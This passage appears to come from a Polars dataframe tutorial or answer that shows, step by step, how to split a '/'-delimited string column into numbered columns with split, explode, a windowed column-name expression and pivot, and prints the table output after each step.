\u2506 string_03 \u2506 string_04 \u2502\n\u2502 --- \u2506 ---                         \u2506 ---       \u2506 ---       \u2506 ---       \u2506 ---       \u2506 ---       \u2502\n\u2502 u32 \u2506 str                         \u2506 str       \u2506 str       \u2506 str       \u2506 str       \u2506 str       \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 0   \u2506 cat                         \u2506 cat       \u2506           \u2506           \u2506           \u2506           \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 cat/dog                     \u2506 cat       \u2506 dog       \u2506           \u2506           \u2506           \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 null                        \u2506           \u2506           \u2506           \u2506           \u2506           \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 3   \u2506                             \u2506           \u2506           \u2506           \u2506           \u2506           \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 cat       \u2506 dog       \u2506 aardvark  \u2506 mouse     \u2506 frog      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n\nHow it works\nWe first assign a row number id (which we'll need later), and use split to separate the strings.  Note that the split strings form a list.\n(\n    df\n    .with_row_count('id')\n    .with_column(pl.col(\"my_str\").str.split(\"/\").alias(\"split_str\"))\n)\n\nshape: (5, 3)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 id  \u2506 my_str                      \u2506 split_str                  \u2502\n\u2502 --- \u2506 ---                         \u2506 ---                        \u2502\n\u2502 u32 \u2506 str                         \u2506 list[str]                  \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 0   \u2506 cat                         \u2506 [\"cat\"]                    \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 cat/dog                     \u2506 [\"cat\", \"dog\"]             \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 null                        \u2506 null                       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 3   \u2506                             \u2506 [\"\"]                       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 [\"cat\", \"dog\", ... \"frog\"] \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nNext, we'll use explode to put each string on its own row.  (Notice how the id column tracks the original row that each string came from.)\n(\n    df\n    .with_row_count('id')\n    .with_column(pl.col(\"my_str\").str.split(\"/\").alias(\"split_str\"))\n    .explode(\"split_str\")\n)\n\nshape: (10, 3)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 id  \u2506 my_str                      \u2506 split_str \u2502\n\u2502 --- \u2506 ---                         \u2506 ---       \u2502\n\u2502 u32 \u2506 str                         \u2506 str       \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 0   \u2506 cat                         \u2506 cat       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 cat/dog                     \u2506 cat       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 cat/dog                     \u2506 dog       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 null                        \u2506 null      \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 3   \u2506                             \u2506           \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 cat       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 dog       \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 aardvark  \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 mouse     \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 frog      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nIn the next step, we're going to generate our column names.  I chose to call each column string_XX where XX is the offset with regards to the original string.\nI've used the handy zfill expression so that 1 becomes 01.  (This makes sure that string_02 comes before string_10 if you decide to sort your columns later.)\nYou can substitute your own naming in this step as you need.\n(\n    df\n    .with_row_count('id')\n    .with_column(pl.col(\"my_str\").str.split(\"/\").alias(\"split_str\"))\n    .explode(\"split_str\")\n    .with_column(\n        (\"string_\" + pl.arange(0, pl.count()).cast(pl.Utf8).str.zfill(2))\n        .over(\"id\")\n        .alias(\"col_nm\")\n    )\n)\n\nshape: (10, 4)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 id  \u2506 my_str                      \u2506 split_str \u2506 col_nm    \u2502\n\u2502 --- \u2506 ---                         \u2506 ---       \u2506 ---       \u2502\n\u2502 u32 \u2506 str                         \u2506 str       \u2506 str       \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 0   \u2506 cat                         \u2506 cat       \u2506 string_00 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 cat/dog                     \u2506 cat       \u2506 string_00 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 cat/dog                     \u2506 dog       \u2506 string_01 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 null                        \u2506 null      \u2506 string_00 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 3   \u2506                             \u2506           \u2506 string_00 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 cat       \u2506 string_00 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 dog       \u2506 string_01 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 aardvark  \u2506 string_02 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 mouse     \u2506 string_03 \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 frog      \u2506 string_04 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nIn the next step, we'll use the pivot function to place each string in its own column.\n(\n    df\n    .with_row_count('id')\n    .with_column(pl.col(\"my_str\").str.split(\"/\").alias(\"split_str\"))\n    .explode(\"split_str\")\n    .with_column(\n        (\"string_\" + pl.arange(0, pl.count()).cast(pl.Utf8).str.zfill(2))\n        .over(\"id\")\n        .alias(\"col_nm\")\n    )\n    .pivot(\n        index=['id', 'my_str'],\n        values='split_str',\n        columns='col_nm',\n    )\n)\n\nshape: (5, 7)\n\u250c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 id  \u2506 my_str                      \u2506 string_00 \u2506 string_01 \u2506 string_02 \u2506 string_03 \u2506 string_04 \u2502\n\u2502 --- \u2506 ---                         \u2506 ---       \u2506 ---       \u2506 ---       \u2506 ---       \u2506 ---       \u2502\n\u2502 u32 \u2506 str                         \u2506 str       \u2506 str       \u2506 str       \u2506 str       \u2506 str       \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502 0   \u2506 cat                         \u2506 cat       \u2506 null      \u2506 null      \u2506 null      \u2506 null      \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 1   \u2506 cat/dog                     \u2506 cat       \u2506 dog       \u2506 null      \u2506 null      \u2506 null      \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 2   \u2506 null                        \u2506 null      \u2506 null      \u2506 null      \u2506 null      \u2506 null      \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 3   \u2506                             \u2506           \u2506 null      \u2506 null      \u2506 null      \u2506 null      \u2502\n\u251c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524\n\u2502 4   \u2506 cat/dog/aardvark/mouse/frog \u2506 cat       \u2506 dog       \u2506 aardvark  \u2506 mouse     \u2506 frog      